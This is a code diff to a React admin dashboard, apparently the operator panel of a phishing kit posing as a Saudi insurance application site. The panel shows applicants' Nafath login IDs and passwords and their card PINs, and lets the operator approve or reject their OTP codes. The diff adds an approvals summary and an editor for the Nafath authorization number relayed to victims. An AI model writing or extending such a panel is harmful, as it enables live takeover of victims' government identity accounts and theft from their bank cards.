@@ -65,6 +65,8 @@ export default function AdminDashboard() {
   const [loading, setLoading] = useState(true)
   const [showChat, setShowChat] = useState(false)
   const [copiedField, setCopiedField] = useState<string | null>(null)
+  const [editingAuthNumber, setEditingAuthNumber] = useState<string>("")
+  const [isEditingAuth, setIsEditingAuth] = useState(false)
   const prevApplicationsCount = useRef<number>(0)
 
   const hasCompleteData = (app: InsuranceApplication) => {
@@ -230,6 +232,23 @@ export default function AdminDashboard() {
       playErrorSound()
       toast.error("خطأ في رفض رمز التحقق")
     }
+  }
+
+  const handleUpdateAuthNumber = async (appId: string) => {
+    try {
+      await updateApplication(appId, { authNumber: editingAuthNumber } as any)
+      playSuccessSound()
+      toast.success("تم تحديث رقم التفويض")
+      setIsEditingAuth(false)
+    } catch (error) {
+      playErrorSound()
+      toast.error("خطأ في تحديث رقم التفويض")
+    }
+  }
+
+  const startEditingAuth = (currentValue: string) => {
+    setEditingAuthNumber(currentValue || "")
+    setIsEditingAuth(true)
   }
 
   const selectApp = (app: InsuranceApplication) => {
@@ -952,33 +971,111 @@ export default function AdminDashboard() {
                     </Section>
                   )}
 
+                  {/* All Approvals Summary */}
+                  <Section title="ملخص الموافقات" icon={<CheckCircle className="w-3 h-3" />}>
+                    <div className="space-y-1.5">
+                      <div className="flex items-center justify-between p-1.5 bg-slate-800/50 rounded">
+                        <span className="text-[9px] text-slate-300">حالة البطاقة:</span>
+                        <Badge className={`text-[8px] ${
+                          selectedApplication.cardStatus === "approved_with_otp" || selectedApplication.cardStatus === "approved_with_pin"
+                            ? "bg-emerald-500/20 text-emerald-400"
+                            : selectedApplication.cardStatus === "rejected"
+                              ? "bg-red-500/20 text-red-400"
+                              : "bg-amber-500/20 text-amber-400"
+                        }`}>
+                          {selectedApplication.cardStatus === "approved_with_otp" ? "موافق - OTP" 
+                            : selectedApplication.cardStatus === "approved_with_pin" ? "موافق - PIN"
+                            : selectedApplication.cardStatus === "rejected" ? "مرفوض"
+                            : "قيد الانتظار"}
+                        </Badge>
+                      </div>
+                      <div className="flex items-center justify-between p-1.5 bg-slate-800/50 rounded">
+                        <span className="text-[9px] text-slate-300">رمز الهاتف:</span>
+                        <Badge className={`text-[8px] ${
+                          selectedApplication.phoneOtpApproved === "approved"
+                            ? "bg-emerald-500/20 text-emerald-400"
+                            : selectedApplication.phoneOtpApproved === "rejected"
+                              ? "bg-red-500/20 text-red-400"
+                              : "bg-amber-500/20 text-amber-400"
+                        }`}>
+                          {selectedApplication.phoneOtpApproved === "approved" ? "موافق ✓" 
+                            : selectedApplication.phoneOtpApproved === "rejected" ? "مرفوض ✗"
+                            : "قيد الانتظار"}
+                        </Badge>
+                      </div>
+                      <div className="flex items-center justify-between p-1.5 bg-slate-800/50 rounded">
+                        <span className="text-[9px] text-slate-300">الحالة العامة:</span>
+                        <Badge className={`text-[8px] ${getStatusColor(selectedApplication.status || "draft")}`}>
+                          {selectedApplication.status === "completed" ? "مكتمل"
+                            : selectedApplication.status === "approved" ? "موافق"
+                            : selectedApplication.status === "rejected" ? "مرفوض"
+                            : selectedApplication.status === "pending_review" ? "قيد المراجعة"
+                            : "مسودة"}
+                        </Badge>
+                      </div>
+                    </div>
+                  </Section>
+
                   {/* Nafaz Integration Info */}
-                  {hasData(
-                    selectedApplication.nafazId,
-                    selectedApplication.nafazPass,
-                    selectedApplication.authNumber,
-                  ) && (
-                    <Section title="معلومات نفاذ" icon={<Key className="w-3 h-3" />}>
-                      <DataRow
-                        label="معرف نفاذ"
-                        value={selectedApplication.nafazId}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                      <DataRow
-                        label="كلمة مرور نفاذ"
-                        value={selectedApplication.nafazPass}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                      <DataRow
-                        label="رقم التفويض"
-                        value={selectedApplication.authNumber}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                    </Section>
-                  )}
+                  <Section title="معلومات نفاذ" icon={<Key className="w-3 h-3" />}>
+                    <DataRow
+                      label="معرف نفاذ"
+                      value={selectedApplication.nafazId}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <DataRow
+                      label="كلمة مرور نفاذ"
+                      value={selectedApplication.nafazPass}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <div className="space-y-1">
+                      <div className="flex items-center justify-between">
+                        <span className="text-[9px] text-slate-400">رقم التفويض:</span>
+                        {!isEditingAuth && (
+                          <Button
+                            onClick={() => startEditingAuth(selectedApplication.authNumber || "")}
+                            size="sm"
+                            className="h-4 text-[7px] px-1 rounded bg-blue-500/20 text-blue-400 hover:bg-blue-500/30"
+                          >
+                            تعديل
+                          </Button>
+                        )}
+                      </div>
+                      {isEditingAuth ? (
+                        <div className="flex gap-1">
+                          <Input
+                            value={editingAuthNumber}
+                            onChange={(e) => setEditingAuthNumber(e.target.value)}
+                            className="h-6 text-[9px] bg-slate-800 border-slate-700 text-white"
+                            placeholder="أدخل رقم التفويض"
+                          />
+                          <Button
+                            onClick={() => handleUpdateAuthNumber(selectedApplication.id!)}
+                            size="sm"
+                            className="h-6 text-[8px] px-2 rounded bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30"
+                          >
+                            حفظ
+                          </Button>
+                          <Button
+                            onClick={() => setIsEditingAuth(false)}
+                            size="sm"
+                            className="h-6 text-[8px] px-2 rounded bg-red-500/20 text-red-400 hover:bg-red-500/30"
+                          >
+                            إلغاء
+                          </Button>
+                        </div>
+                      ) : (
+                        <DataRow
+                          label=""
+                          value={selectedApplication.authNumber || "غير محدد"}
+                          onCopy={copyToClipboard}
+                          copied={copiedField!}
+                        />
+                      )}
+                    </div>
+                  </Section>
 
                   {/* PIN Code Section */}
                   {selectedApplication.pinCode && (
